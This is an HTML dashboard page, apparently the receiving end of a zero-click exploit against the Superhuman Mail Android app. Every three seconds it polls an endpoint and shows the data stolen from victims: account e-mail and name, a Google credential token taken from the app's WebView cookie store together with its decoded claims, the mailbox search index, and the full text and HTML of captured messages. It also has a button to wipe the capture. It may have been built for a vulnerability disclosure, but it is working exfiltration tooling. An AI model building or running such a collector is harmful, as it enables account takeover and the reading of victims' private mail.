<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Superhuman Mail — 0-click exfiltration monitor</title>
<style>
  :root{--bg:#0b0f17;--panel:#131a26;--line:#22304a;--txt:#e6edf7;--dim:#8fa3bf;
        --ok:#38d39f;--warn:#ffb454;--danger:#ff5d5d;--info:#63b3ff;--accent:#a78bfa}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--txt);
       font:14px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
  header{position:sticky;top:0;z-index:5;display:flex;align-items:center;gap:14px;flex-wrap:wrap;
         padding:15px 22px;background:linear-gradient(180deg,#101826,#0d1420);
         border-bottom:1px solid var(--line)}
  h1{font-size:16px;margin:0;letter-spacing:.2px}
  .pill{display:inline-block;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:600;
        background:color-mix(in srgb,var(--a) 20%,transparent);color:var(--a);
        border:1px solid color-mix(in srgb,var(--a) 45%,transparent)}
  .right{margin-left:auto;display:flex;align-items:center;gap:14px;font-size:12px;color:var(--dim)}
  .dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok);
       display:inline-block;animation:p 1.6s infinite}
  @keyframes p{50%{opacity:.35}}
  main{display:grid;grid-template-columns:repeat(auto-fit,minmax(430px,1fr));gap:16px;
       padding:18px 22px 48px}
  .card{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--a);
        border-radius:10px;padding:14px 16px}
  .card h2{margin:0 0 12px;font-size:12.5px;text-transform:uppercase;letter-spacing:.7px;
           color:var(--a);display:flex;align-items:baseline;gap:8px;flex-wrap:wrap}
  .card h2 small{font-size:11px;text-transform:none;letter-spacing:0;color:var(--dim);font-weight:400}
  .full{grid-column:1/-1}
  .kv{display:flex;gap:12px;padding:5px 0;border-bottom:1px dashed #1b2637}
  .kv:last-child{border-bottom:0}
  .k{min-width:158px;color:var(--dim);font-size:12px}
  .v{flex:1;word-break:break-word}
  code,pre,textarea{font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
  pre{background:#0a0f18;border:1px solid var(--line);border-radius:8px;padding:10px;margin:8px 0 0;
      white-space:pre-wrap;word-break:break-word;max-height:340px;overflow:auto;font-size:12px}
  table{width:100%;border-collapse:collapse;font-size:12px}
  th,td{text-align:left;padding:5px 8px;border-bottom:1px solid #1b2637;vertical-align:top}
  th{color:var(--dim);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px}
  .dim{color:var(--dim)} .empty{color:var(--dim);font-style:italic;padding:6px 0}
  .tok code{color:var(--accent);font-size:11.5px;word-break:break-all}
  .msg{border:1px solid var(--line);border-radius:8px;padding:10px;margin-bottom:10px}
  .msghead{display:flex;gap:10px;align-items:center;margin-bottom:6px;flex-wrap:wrap}
  .rank{color:var(--warn);font-weight:700}
  details summary{cursor:pointer;color:var(--info);font-size:12px;margin-top:6px}
  .btns{display:flex;gap:8px}
  button{background:#1b2637;color:var(--txt);border:1px solid var(--line);border-radius:7px;
         padding:5px 11px;font-size:12px;cursor:pointer}
  button:hover{border-color:var(--info)}
  .err{color:var(--danger)}
</style>
</head>
<body>
<header>
  <h1>Superhuman Mail — 0-click exfiltration monitor</h1>
  <span class="pill" style="--a:#38d39f" id="p-count">0 beacons</span>
  <span class="pill" style="--a:#a78bfa" id="p-store">storage: ?</span>
  <span class="right">
    <span><span class="dot"></span> live · refresh 3s</span>
    <span class="btns">
      <button onclick="refresh()">Refresh</button>
      <button onclick="wipe()">Clear capture</button>
    </span>
  </span>
</header>
<main>
  <section class="card" style="--a:#38d39f" id="c-id"></section>
  <section class="card" style="--a:#a78bfa" id="c-tok"></section>
  <section class="card" style="--a:#63b3ff" id="c-mail"></section>
  <section class="card" style="--a:#ffb454" id="c-prog"></section>
  <section class="card full" style="--a:#ffb454" id="c-msgs"></section>
</main>
<script>
const esc = (s) => String(s === null || s === undefined ? '' : s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const kv = (k,v,mono) => `<div class="kv"><span class="k">${esc(k)}</span>
  <span class="v ${mono?'':''}" ${mono?'style="font-family:ui-monospace,Consolas,monospace"':''}>${esc(v)}</span></div>`;
const none = '<div class="empty">not captured yet</div>';
const when = (t) => t ? new Date(t).toLocaleTimeString() : '—';

function render(d){
  document.getElementById('p-count').textContent = d.count + ' beacons';
  document.getElementById('p-store').textContent = 'storage: ' + d.storage
    + (d.storage === 'memory' ? ' (enable KV for persistence)' : '');
  document.getElementById('p-store').style.setProperty('--a', d.storage === 'memory' ? '#ffb454' : '#a78bfa');

  document.getElementById('c-id').innerHTML =
    `<h2>Victim identity <small>shared_prefs/account.xml</small></h2>`
    + kv('e-mail', d.account_email || '—')
    + kv('name', d.account_name || '—')
    + kv('beacons received', d.count)
    + kv('first / last', when(d.first) + '  →  ' + when(d.last))
    + (d.account_raw ? `<pre>${esc(d.account_raw)}</pre>` : '');

  const claims = d.claims || {};
  document.getElementById('c-tok').innerHTML =
    `<h2>Google credential <small>app_webview/Default/Cookies</small></h2>`
    + kv('token length', d.token_len ? d.token_len + ' bytes' : '—')
    + (d.token ? `<div class="tok"><code>${esc(d.token.slice(0,120))}…</code></div>
        <pre>${esc(d.token)}</pre>` : none)
    + (Object.keys(claims).length
        ? `<table><tr><th>claim</th><th>value</th></tr>`
          + Object.keys(claims).map(k => `<tr><td class="k">${esc(k)}</td><td>${esc(claims[k])}</td></tr>`).join('')
          + `</table>` : '');

  document.getElementById('c-mail').innerHTML =
    `<h2>Mailbox <small>databases/&lt;acct&gt;_SearchDataStore.db</small></h2>`
    + kv('full-text index', d.index_bytes ? d.index_bytes + ' chars' : '—')
    + kv('thread ids', d.ids || '—')
    + kv('messages captured', d.messages ? d.messages.length : 0)
    + ((d.ids_top||[]).length ? `<pre>${esc(d.ids_top.slice(0,12).join('  '))}</pre>` : '');

  document.getElementById('c-prog').innerHTML =
    `<h2>Live progress <small>in arrival order</small></h2>`
    + ((d.progress||[]).length
        ? `<table><tr><th>time</th><th>step</th><th>detail</th></tr>`
          + d.progress.map(p => `<tr><td class="dim">${when(p.t)}</td>
              <td><span class="pill" style="--a:#63b3ff">${esc(p.step)}</span></td>
              <td class="dim" style="font-family:ui-monospace,Consolas,monospace">${esc(JSON.stringify(p.detail).slice(0,110))}</td></tr>`).join('')
          + `</table>` : none)
    + ((d.errors||[]).length ? `<div class="err" style="margin-top:10px">errors: ${esc(d.errors.join(', '))}</div>` : '');

  document.getElementById('c-msgs').innerHTML =
    `<h2>The captured messages <small>newest first · plain text readable, HTML expandable</small></h2>`
    + ((d.messages||[]).length ? d.messages.map(m => `
        <div class="msg">
          <div class="msghead"><span class="rank">#${esc(m.rank)}</span>
            <code>${esc(m.sid)}</code><span class="dim">${esc(m.len)} chars of HTML</span></div>
          <pre>${esc((m.text||'(no plain text)').slice(0,4000))}</pre>
          <details><summary>rendered HTML (${esc((m.html||'').length)} chars)</summary>
            <pre>${esc((m.html||'').slice(0,6000))}</pre></details>
        </div>`).join('') : none);
}

async function refresh(){
  try{
    const r = await fetch('/api/data?ts=' + Date.now(), {cache:'no-store'});
    render(await r.json());
  }catch(e){}
}
async function wipe(){
  if(!confirm('Wipe every captured beacon?')) return;
  await fetch('/api/data?clear=1');
  refresh();
}
refresh();
setInterval(refresh, 3000);
</script>
</body>
</html>
